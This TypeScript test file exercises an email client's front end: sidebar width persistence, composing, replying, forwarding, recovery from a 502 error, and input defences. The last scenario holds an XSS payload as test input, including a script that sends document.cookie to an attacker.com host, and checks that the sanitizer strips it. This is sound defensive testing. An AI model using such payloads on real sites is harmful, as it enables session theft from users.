/**
 * Tier 4 - Real-World Application Scenarios: End-to-End User Workflows
 * Tests multi-step user journeys simulating actual desktop, mobile, and error conditions.
 */

import test from "node:test";
import assert from "node:assert/strict";
import { MockWindow, MockFile } from "../harness/dom-harness.ts";
import { MockBackendApi } from "../harness/mock-api.ts";
import {
  SIDEBAR_CONSTRAINTS,
  clampSidebarWidth,
  loadSavedSidebarWidth,
  createBlankDraft,
  createReplyDraft,
  createForwardDraft,
  sanitizeHtmlContent,
  tokenizeRecipients,
  validateEmail,
  validateTotalAttachmentSize,
  evaluateMasterDetailView,
  type ComposeDraftState,
} from "../harness/spec-contracts.ts";

test("Tier 4 - Scenario 1: New User Setup, Custom Sidebar, Arbitrary Recipient & Email Send", async () => {
  const windowMock = new MockWindow({ width: 1440, height: 900 });
  const storage = windowMock.localStorage;
  const api = new MockBackendApi();

  // Step 1: User visits app, initial default sidebar width is 320px
  let currentSidebarWidth = loadSavedSidebarWidth(storage);
  assert.strictEqual(currentSidebarWidth, 320);

  // Step 2: User customizes sidebar by dragging divider to 395px
  const targetWidth = 395;
  const clamped = clampSidebarWidth(targetWidth);
  storage.setItem(SIDEBAR_CONSTRAINTS.STORAGE_KEY, clamped.toString());
  currentSidebarWidth = clamped;
  assert.strictEqual(currentSidebarWidth, 395);

  // Step 3: Simulated page refresh reads back 395px
  const reloadedWidth = loadSavedSidebarWidth(storage);
  assert.strictEqual(reloadedWidth, 395);

  // Step 4: User clicks global Compose button in Sidebar
  let composerOpen = true;
  let draft: ComposeDraftState = createBlankDraft();
  assert.strictEqual(composerOpen, true);

  // Step 5: User types arbitrary recipient (not in contacts)
  const rawInput = "partner@external-firm.com";
  const tokens = tokenizeRecipients(rawInput);
  assert.strictEqual(tokens.length, 1);
  assert.strictEqual(validateEmail(tokens[0]), true);
  draft.to = tokens;

  // Step 6: User enters CC and BCC
  draft.cc = tokenizeRecipients("manager@mycompany.com");
  draft.bcc = tokenizeRecipients("compliance-audit@mycompany.com");
  draft.subject = "Partnership Terms Agreement";

  // Step 7: User writes formatted rich-text body
  const bodyInput = '<p>Dear Partner,</p><p>Please review the <b>attached agreement</b> on <a href="https://example.com/terms">our portal</a>.</p>';
  draft.bodyHtml = sanitizeHtmlContent(bodyInput);
  draft.bodyPlain = "Dear Partner, Please review the attached agreement on our portal.";

  // Step 8: User attaches a 2MB document
  const file = new MockFile("Partnership_Agreement.pdf", 2 * 1024 * 1024, "application/pdf", "dummy pdf bytes");
  const sizeCheck = validateTotalAttachmentSize([{ size: file.size }]);
  assert.strictEqual(sizeCheck.valid, true);

  const base64Content = await file.toBase64();
  draft.attachments.push({
    filename: file.name,
    size: file.size,
    mimeType: file.type,
    content: base64Content,
  });

  // Step 9: User sends email
  const response = await api.sendEmail({
    to: draft.to,
    cc: draft.cc,
    bcc: draft.bcc,
    subject: draft.subject,
    body_html: draft.bodyHtml,
    body_plain: draft.bodyPlain,
    attachments: draft.attachments.map((a) => ({
      filename: a.filename,
      content: a.content || "",
      mimeType: a.mimeType,
    })),
  });

  // Step 10: Verify API received payload and composer closes
  assert.strictEqual(response.status, 200);
  assert.strictEqual(response.data.status, "sent");
  composerOpen = false;
  draft = createBlankDraft();

  assert.strictEqual(composerOpen, false);
  assert.strictEqual(draft.subject, "");
});

test("Tier 4 - Scenario 2: Mobile Triage, Master-Detail Switching, Thread Reply & Minimize", async () => {
  const windowMock = new MockWindow({ width: 375, height: 667 });
  const api = new MockBackendApi();

  let selectedContactId: string | null = null;
  let composerOpen = false;
  let composerMinimized = false;
  let draft: ComposeDraftState = createBlankDraft();

  // Step 1: User on mobile view sees ContactList
  assert.strictEqual(evaluateMasterDetailView(windowMock.innerWidth, selectedContactId), "contact-list");

  // Step 2: User taps on Contact 'contact_alice'
  selectedContactId = "contact_alice";
  assert.strictEqual(evaluateMasterDetailView(windowMock.innerWidth, selectedContactId), "chat-area");

  // Step 3: User reads latest message and taps 'Reply'
  const messageToReply = {
    id: "msg_777",
    threadId: "thread_alice_conversation",
    from: "alice@acme.com",
    subject: "Project Deployment Schedule",
    bodyPlain: "Are we on schedule for Friday release?",
  };

  draft = createReplyDraft(messageToReply);
  composerOpen = true;
  assert.strictEqual(draft.replyMode, "reply");
  assert.strictEqual(draft.subject, "Re: Project Deployment Schedule");
  assert.deepStrictEqual(draft.to, ["alice@acme.com"]);

  // Step 4: User minimizes composer to re-read conversation details
  composerMinimized = true;
  assert.strictEqual(composerMinimized, true);
  assert.strictEqual(composerOpen, true);

  // Step 5: User restores composer and completes reply text
  composerMinimized = false;
  draft.bodyPlain = "Yes, staging is verified and Friday is confirmed." + draft.bodyPlain;

  // Step 6: User sends reply
  const sendRes = await api.sendEmail({
    to: draft.to,
    subject: draft.subject,
    body_plain: draft.bodyPlain,
    thread_id: draft.threadId,
    in_reply_to: draft.inReplyTo,
    references: draft.references,
  });

  assert.strictEqual(sendRes.status, 200);
  composerOpen = false;

  // Step 7: User taps Back button in header to return to ContactList
  selectedContactId = null;
  assert.strictEqual(evaluateMasterDetailView(windowMock.innerWidth, selectedContactId), "contact-list");
});

test("Tier 4 - Scenario 3: Forward Workflow with Contact Autocomplete and Quoted Message", async () => {
  const api = new MockBackendApi();

  const contacts = [
    { id: "c1", name: "David Miller", email: "david@security.org" },
    { id: "c2", name: "Diana Prince", email: "diana@justice.org" },
  ];

  // Original message from vendor
  const vendorMessage = {
    id: "msg_vendor_99",
    from: "support@cloudprovider.com",
    subject: "Incident Report: EU-West Degradation",
    bodyPlain: "Root cause was a memory leak in border proxy router.",
    bodyHtml: "<p>Root cause was a <b>memory leak</b> in border proxy router.</p>",
  };

  // User initiates forward
  const draft = createForwardDraft(vendorMessage);
  assert.strictEqual(draft.replyMode, "forward");
  assert.strictEqual(draft.subject, "Fwd: Incident Report: EU-West Degradation");
  assert.deepStrictEqual(draft.to, []);

  // User types 'David' into To input, autocomplete filters matching contact
  const query = "David";
  const matches = contacts.filter((c) => c.name.toLowerCase().includes(query.toLowerCase()));
  assert.strictEqual(matches.length, 1);

  // User selects David from suggestions
  draft.to = [matches[0].email];
  assert.deepStrictEqual(draft.to, ["david@security.org"]);

  // User sends forward
  const res = await api.sendEmail({
    to: draft.to,
    subject: draft.subject,
    body_plain: draft.bodyPlain,
    body_html: draft.bodyHtml,
  });

  assert.strictEqual(res.status, 200);
  assert.strictEqual(api.receivedRequests[0].to[0], "david@security.org");
  assert.match(api.receivedRequests[0].body_plain!, /support@cloudprovider\.com/);
});

test("Tier 4 - Scenario 4: Network Outage Recovery & Draft Resilience Workflow", async () => {
  const api = new MockBackendApi();

  // User composes comprehensive email
  const userDraft: ComposeDraftState = {
    to: ["board@foundation.org"],
    cc: ["legal@foundation.org"],
    bcc: [],
    subject: "End of Year Financial Audit",
    bodyPlain: "Attached is the audited balance sheet for FY2026.",
    bodyHtml: "<p>Attached is the <b>audited balance sheet</b> for FY2026.</p>",
    attachments: [
      {
        filename: "FY2026_Audit.xlsx",
        size: 512 * 1024,
        mimeType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        content: Buffer.from("audit excel bytes").toString("base64"),
      },
    ],
    replyMode: "new",
  };

  // Backend encounters temporary 502 Bad Gateway
  api.simulateFailure(502, "Bad Gateway: Upstream Mail Service Unreachable");

  const failRes = await api.sendEmail({
    to: userDraft.to,
    cc: userDraft.cc,
    subject: userDraft.subject,
    body_plain: userDraft.bodyPlain,
    body_html: userDraft.bodyHtml,
    attachments: userDraft.attachments.map((a) => ({
      filename: a.filename,
      content: a.content || "",
      mimeType: a.mimeType,
    })),
  });

  // Client displays error banner
  assert.strictEqual(failRes.status, 502);
  assert.strictEqual(failRes.data.detail, "Bad Gateway: Upstream Mail Service Unreachable");

  // Verified: Draft is completely intact
  assert.deepStrictEqual(userDraft.to, ["board@foundation.org"]);
  assert.strictEqual(userDraft.subject, "End of Year Financial Audit");
  assert.strictEqual(userDraft.attachments.length, 1);

  // Network recovers, user retries send
  api.reset();
  const retryRes = await api.sendEmail({
    to: userDraft.to,
    cc: userDraft.cc,
    subject: userDraft.subject,
    body_plain: userDraft.bodyPlain,
    body_html: userDraft.bodyHtml,
    attachments: userDraft.attachments.map((a) => ({
      filename: a.filename,
      content: a.content || "",
      mimeType: a.mimeType,
    })),
  });

  assert.strictEqual(retryRes.status, 200);
  assert.strictEqual(retryRes.data.status, "sent");
});

test("Tier 4 - Scenario 5: Adversarial XSS & Oversized Attachment Defense Workflow", async () => {
  const api = new MockBackendApi();

  // Attacker attempts malicious payload injection
  const attackHtml = `
    <p>Innocent invoice</p>
    <script>fetch('http://attacker.com/cookie?c=' + document.cookie)</script>
    <img src="nonexistent.png" onerror="alert('xss')" />
    <a href="javascript:alert(1)">Click to verify identity</a>
  `;

  // Step 1: Sanitizer cleanses the attack payload
  const sanitized = sanitizeHtmlContent(attackHtml);
  assert.doesNotMatch(sanitized, /<script/i);
  assert.doesNotMatch(sanitized, /onerror/i);
  assert.doesNotMatch(sanitized, /javascript:/i);
  assert.match(sanitized, /<p>Innocent invoice<\/p>/);

  // Step 2: Attacker attempts to attach 30MB file (exceeds 20MB limit)
  const oversizedFile = new MockFile("malicious_archive.zip", 30 * 1024 * 1024, "application/zip");
  const sizeValidation = validateTotalAttachmentSize([{ size: oversizedFile.size }]);

  assert.strictEqual(sizeValidation.valid, false);
  assert.match(sizeValidation.error!, /exceeds maximum allowed limit of 20 MB/);

  // Step 3: Legitimate user corrects file to 3MB safe attachment
  const legitimateFile = new MockFile("safe_document.pdf", 3 * 1024 * 1024, "application/pdf", "safe pdf");
  const safeValidation = validateTotalAttachmentSize([{ size: legitimateFile.size }]);
  assert.strictEqual(safeValidation.valid, true);

  // Step 4: Safely transmit sanitized payload
  const response = await api.sendEmail({
    to: ["finance@company.com"],
    subject: "Legitimate Invoice Submission",
    body_html: sanitized,
    body_plain: "Innocent invoice",
    attachments: [
      {
        filename: legitimateFile.name,
        content: await legitimateFile.toBase64(),
        mimeType: legitimateFile.type,
      },
    ],
  });

  assert.strictEqual(response.status, 200);
  assert.strictEqual(response.data.status, "sent");
});
